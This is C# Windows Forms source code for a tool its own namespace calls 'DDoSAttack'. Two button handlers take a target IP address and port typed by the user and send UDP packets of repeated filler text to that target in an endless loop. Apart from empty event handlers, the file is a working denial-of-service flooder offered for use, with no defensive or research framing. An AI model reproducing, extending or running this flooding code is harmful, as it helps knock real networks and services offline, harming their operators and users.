﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;


namespace DDoSAttack_For_Windows_NET_4._6._1
{
    public partial class Form1 : Form
    {
        public string Bigspammer { get; private set; }
        public string WebRequestFlooding { get; private set; }
        public string Flooding { get; private set; }

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void label5_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)

        {
            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram,
ProtocolType.Udp);
            IPAddress P = IPAddress.Parse(textBox1.Text);
            int i = int.Parse(textBox2.Text);
        goback:
            IPEndPoint endPoint = new IPEndPoint(P, i);

            string text = "的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容的笑容都没你的甜的笑容都没你的甜的笑容都没的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容的笑容都没你的甜的笑容的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你都";

            byte[] send_buffer = Encoding.ASCII.GetBytes(text+"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"+text);

            sock.SendTo(send_buffer, endPoint);
           
            goto goback;
            this.timer1.Start();
        }

    

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void label6_Click(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            this.progressBar1.Increment(1);
        }

        private void label6_Click_1(object sender, EventArgs e)
        {

        }

        private void label7_Click(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            Application.Restart();
            Environment.Exit(0);
        }

        private void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void label7_Click_1(object sender, EventArgs e)
        {

        }

        private void button3_Click(object sender, EventArgs e)
        {
            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram,
ProtocolType.Udp);


            IPAddress P = IPAddress.Parse(textBox1.Text);
            int i = int.Parse(textBox2.Text);




        goback1:

            IPEndPoint endPoint = new IPEndPoint(P, i);

            string text = "的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容的笑容都没你的甜的笑容都没你的甜的笑容都没的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容的笑容都没你的甜的笑容的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容都没你的甜的笑容的笑容都没你的甜的笑容都没你的甜的笑容都没你的的笑容都没你的甜的笑容都没你的甜的笑容都没你都";

            byte[] send_buffer = Encoding.ASCII.GetBytes(text+"nah");

            sock.SendTo(send_buffer, endPoint);
            
            goto goback1;
        }
    }
}
